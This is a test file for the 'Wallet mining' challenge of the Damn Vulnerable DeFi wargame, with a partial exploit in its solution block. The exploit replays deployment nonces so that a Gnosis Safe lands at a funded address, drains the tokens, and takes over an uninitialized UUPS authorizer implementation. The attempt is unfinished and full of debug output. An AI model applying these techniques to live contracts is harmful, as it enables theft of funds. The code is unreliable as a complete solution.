const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");
const { execTransaction } = require("./utils.js");

describe("[Challenge] Wallet mining", function () {
  let deployer, player;
  let token, authorizer, walletDeployer;
  let initialWalletDeployerTokenBalance;

  const DEPOSIT_ADDRESS = "0x9b6fb606a9f5789444c17768c6dfcf2f83563801";
  const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;
  const ADDRESS_0 = "0x0000000000000000000000000000000000000000";

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, ward, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy authorizer with the corresponding proxy
    authorizer = await upgrades.deployProxy(
      await ethers.getContractFactory("AuthorizerUpgradeable", deployer),
      [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
      { kind: "uups", initializer: "init" }
    );

    expect(await authorizer.owner()).to.eq(deployer.address);
    expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
    expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

    // Deploy Safe Deployer contract
    walletDeployer = await (
      await ethers.getContractFactory("WalletDeployer", deployer)
    ).deploy(token.address);
    expect(await walletDeployer.chief()).to.eq(deployer.address);
    expect(await walletDeployer.gem()).to.eq(token.address);

    // Set Authorizer in Safe Deployer
    await walletDeployer.rule(authorizer.address);
    expect(await walletDeployer.mom()).to.eq(authorizer.address);

    await expect(
      walletDeployer.can(ward.address, DEPOSIT_ADDRESS)
    ).not.to.be.reverted;
    await expect(
      walletDeployer.can(player.address, DEPOSIT_ADDRESS)
    ).to.be.reverted;

    // Fund Safe Deployer with tokens
    initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
    await token.transfer(
      walletDeployer.address,
      initialWalletDeployerTokenBalance
    );

    // Ensure these accounts start empty
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq("0x");
    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq(
      "0x"
    );
    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq(
      "0x"
    );

    // Deposit large amount of DVT tokens to the deposit address
    await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

    // Ensure initial balances are set correctly
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
    expect(await token.balanceOf(walletDeployer.address)).eq(
      initialWalletDeployerTokenBalance
    );
    expect(await token.balanceOf(player.address)).eq(0);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    const WALLET_OWNER_ADDR = `0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a`;

    await player.sendTransaction({
      to: WALLET_OWNER_ADDR,
      value: ethers.utils.parseEther("1"),
    });

    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [WALLET_OWNER_ADDR],
    });

    const safeDeployer = ethers.provider.getSigner(WALLET_OWNER_ADDR);
    const safeFactory = await ethers.getContractFactory(
      "GnosisSafe",
      safeDeployer
    );

    const masterCopy = await safeFactory.deploy();
    console.log("Master copy address:", masterCopy.address);

    //to increase nonce
    await safeFactory.deploy();

    const proxyFactory = await (
      await ethers.getContractFactory("GnosisSafeProxyFactory", safeDeployer)
    ).deploy();

    console.log("proxyFactory address:", proxyFactory.address);
    // await authorizer
    //   .connect(player)
    //   .init([player.address], ["0x04678c6e1e0b1a2632ff85b78610a0a41418c5ed"]);

    const safeAddresses = [];
    for (let i = 0; i < 5000; i++) {
      const gnosisSafeData = masterCopy.interface.encodeFunctionData("setup", [
        [player.address],
        1,
        ADDRESS_0,
        "0x",
        ADDRESS_0,
        ADDRESS_0,
        0,
        ADDRESS_0,
      ]);

      await walletDeployer.connect(player).drop(gnosisSafeData);

      if (!((await ethers.provider.getCode(DEPOSIT_ADDRESS)) === "0x")) {
        console.log("Safe deployed at deposit address");
        break;
      }

      safeAddresses;
    }

    console.log("player address", player.address);
    const safe = await masterCopy.attach(DEPOSIT_ADDRESS);

    const txData = token.interface.encodeFunctionData("transfer", [
      player.address,
      DEPOSIT_TOKEN_AMOUNT,
    ]);

    await execTransaction([player], safe, token.address, 0, txData, 0);

    console.log(
      "await authorizer.owner()",
      await authorizer.owner(),
      deployer.address
    );

    // console.log(await ethers.provider.getBalance(walletDeployer.address));
    console.log(
      "wallet deployer balance",
      await token.balanceOf(walletDeployer.address)
    );

    console.log(
      "implmention",
      await ethers.provider.getStorageAt(
        authorizer.address,
        "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
      )
    );

    console.log(
      "imple storage",
      await ethers.provider.getStorageAt(
        "0xe7f1725e7734ce288f8367e1bb143e90bb3f0512",
        "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
      )
    );

    const authorizerImplmention = await (
      await ethers.getContractFactory("AuthorizerUpgradeable")
    ).attach("0xe7f1725e7734ce288f8367e1bb143e90bb3f0512");

    console.log("ooo", await authorizerImplmention.owner());
    await authorizerImplmention.connect(player).init([], []);
    console.log("Player add", player.address);
    console.log(
      "authorizerImplmention owner:",
      await authorizerImplmention.owner()
    );
    console.log("interface", authorizerImplmention.interface.functions);

    // for (let i = 0; i < 43; i++) {
    //   const gnosisSafeData = masterCopy.interface.encodeFunctionData("setup", [
    //     player.address,
    //     1,
    //     ADDRESS_0,
    //     "0x",
    //     ADDRESS_0,
    //     ADDRESS_0,
    //     0,
    //     ADDRESS_0,
    //   ]);

    // }

    // https://github.com/tinchoabbate/damn-vulnerable-defi/discussions/24
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Factory account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.fact())
    ).to.not.eq("0x");

    // Master copy account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.copy())
    ).to.not.eq("0x");

    // Deposit account must have code
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq("0x");

    // The deposit address and the Safe Deployer contract must not hold tokens
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
    expect(await token.balanceOf(walletDeployer.address)).to.eq(0);

    // Player must own all tokens
    expect(await token.balanceOf(player.address)).to.eq(
      initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)
    );
  });
});
